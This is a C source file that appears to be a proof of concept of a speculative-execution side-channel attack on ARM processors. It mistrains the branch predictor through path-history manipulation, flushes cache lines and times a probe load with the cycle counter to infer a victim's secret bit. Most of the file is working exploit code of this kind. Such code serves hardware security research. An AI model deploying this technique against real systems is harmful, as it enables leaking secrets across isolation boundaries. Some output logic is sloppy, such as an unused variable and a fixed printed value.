#include "Attacker_ii.h"
#include "Victim.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include "evict_set.h"

unsigned char attacker_array[BYTE_MAX*Cache_Line];
int randa[BYTE_MAX];
unsigned long long difference[BYTE_MAX];
int len_array[BYTE_MAX*Cache_Line];
int times[BYTE_MAX];
char mark[BYTE_MAX];

extern Elem** evsets;

// evict set
cache_ctx_t evict_set_for_attacker_array = NULL;
cache_ctx_t evict_set_for_len_array = NULL;

#define min(x, y) (x) < (y) ? (x) : (y)

int PHR_Flush(int callLen) {
    int i;
    volatile int temp = 3;
    for(i = 0; i < PHR_LEN*8+1; i++) {
		i += (i+1)/(i+1)-1;
    }
    // temp+=func01(1);
    
    asm volatile("isb\n");
	asm volatile("dmb sy\n");
    
    temp+=func01(callLen);
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    asm volatile("isb\n");
	asm volatile("dsb sy\n");
    
	i = 0;
    if (i < len_array[i*Cache_Line])
    	temp += attacker_array[i * Cache_Line];
    return temp;
}

int main(int argc, char* argv[]) {
    unsigned char temp;
	uint64_t begin, end;
    int secret;
    volatile int tmp = 0;

    if(argc == 2)
        secret = atoi(argv[1]);
    else secret = 15;
    

    clock_t begin_time = clock();
    for (int k = 0; k < ATK_ROUNDS; k++) {
        for(int i = 0; i < 3; i++) {
            attacker_array[i*Cache_Line] = i+1;
            // difference[i] = 99999;
            len_array[i*Cache_Line] = PHR_LEN+10;
        }
    	// train S(0, 0, PHR_LEN) ~ S(0, PHR_LEN, 0)
        for (int i = 0; i < 2; i++) {
            len_array[0] = 1-i;
            for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
                tmp=PHR_Flush(i);
				
                asm volatile("dsb sy\n");
                asm volatile("isb\n");
            }
			len_array[0] = 0;
        }
		// attacker retrieve
		len_array[0] = 0;
		asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array+ 0*Cache_Line));    
		asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array+ 0*Cache_Line));

        // #include "unroll_code_if.c" // flush with eviciton-set, do not use DC CIVAC

		// trigger victim
		tmp+=PHR_Flush(secret);
		unsigned char temp;
		// check cache hit?
			asm volatile (
				"isb \n"
				"dsb sy\n"
				"mrs %[times], PMCCNTR_EL0\n"
				:[times]"=&r"(begin)
				::
			);
			temp = *(unsigned char*)(attacker_array);
			asm volatile (
				"isb \n"
				"dsb sy\n"
				"mrs %[times], PMCCNTR_EL0\n"
				:[times]"=&r"(end)
				::
			);
			difference[0] = end-begin;
			times[0] += (end-begin) <= HIT_THRESHOLD;
    }
	mark[0] = times[0] >= TIMES_THRESHOLD;
	if(mark[0]) {
		int secret;
		printf("confidence [%d] hit at: %d, means secret equals %d\n", times[0], 0, 0);
	} else {
		puts("secret equals 1");
	}
}
